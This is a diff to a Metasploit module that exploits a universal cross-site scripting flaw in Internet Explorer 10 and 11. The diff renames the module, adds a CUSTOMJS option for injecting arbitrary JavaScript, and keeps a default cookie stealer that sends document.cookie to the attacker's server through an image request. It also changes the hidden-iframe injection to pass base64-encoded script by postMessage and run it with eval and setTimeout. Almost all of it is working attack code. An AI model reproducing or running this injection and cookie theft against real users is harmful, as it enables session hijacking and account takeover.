@@ -11,11 +11,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info={})
     super(update_info(info,
-      'Name'           => "Microsoft Internet Explorer 10 and 11 Cross-Domain Cookie Stealing",
+      'Name'           => "Microsoft Internet Explorer 10 and 11 Cross-Domain JavaScript Injection",
       'Description'    => %q{
           This module exploits a universal cross-site scripting (UXSS) vulnerability found in Internet
           Explorer 10 and 11. It will steal the cookie of a specific webiste (set by the TARGET_URI
           datastore option). You will also most likely need to configure the URIHOST if you are behind NAT.
+          If CUSTOMJS isn't specified, a default cookie stealer will kick in.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -36,7 +37,8 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
     [
-      OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ])
+      OptString.new('TARGET_URI', [ true, 'The URL for the target iframe' ]),
+      OptString.new('CUSTOMJS', [ false, 'Custom JavaScript' ])
     ], self.class)
   end
 
@@ -94,12 +96,17 @@ class Metasploit3 < Msf::Auxiliary
     @server_uri ||= get_uri
   end
 
+  def js
+    datastore['CUSTOMJS'] || %Q|var e = document.createElement('img'); e.src='#{server_uri}/#{ninja_cookie_stealer_name}?data=' + encodeURIComponent(document.cookie);|
+  end
+
   def html
     %Q|
 <iframe style="display:none" src="#{get_resource}/redirect.php"></iframe>
 <iframe style="display:none" src="#{datastore['TARGET_URI']}"></iframe>
 <script>
-    var payload = "var e = document.createElement('img'); e.src='#{server_uri}/#{ninja_cookie_stealer_name}?data=' + encodeURIComponent(document.cookie);"
+    window.onmessage = function(e){ top[1].postMessage(atob("#{Rex::Text.encode_base64(js)}"),"*"); };
+    var payload = 'window.onmessage=function(e){ setTimeout(e.data); }; top.postMessage(\\\\"\\\\",\\\\"*\\\\")';
     top[0].eval('_=top[1];with(new XMLHttpRequest)open("get","#{get_resource}/sleep.php",false),send();_.location="javascript:%22%3Cscript%3E'+ encodeURIComponent(payload) +'%3C%2Fscript%3E%22"');
 </script>
     |
